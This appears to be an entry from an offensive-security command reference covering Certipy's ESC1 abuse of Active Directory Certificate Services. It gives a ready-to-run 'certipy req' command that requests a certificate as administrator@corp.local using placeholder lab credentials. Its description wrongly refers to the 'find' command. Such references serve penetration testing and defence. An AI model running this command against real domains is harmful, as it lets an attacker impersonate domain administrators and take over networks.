---
description: |
  Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). The find command is useful for enumerating AD CS certificate templates, certificate authorities and other configurations.

  Command Reference:
  ```
  Username: john@corp.local

  Password: Passw0rd

  CertificateAuthority: corp-DC-CA

  Target CA Server: ca.corp.local

  Arbitrary UPN: administrator@corp.local

  DC Server: dc.corp.local
  ```
command: |
  certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1-Test -upn administrator@corp.local -dns dc.corp.local
code: |
    ESC1 is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN).

    For ESC1, we can request a certificate based on the vulnerable certificate template 
    and specify an arbitrary UPN or DNS SAN with the `-upn` and `-dns` parameter, respectively.
items:
  - Username
  - Password
  - CA
  - CA Server
services:
  - ADCS
  - LDAP
OS:
  - Windows
  - Linux
attack_types:
  - Exploitation
references:
  - https://github.com/ly4k/Certipy
---

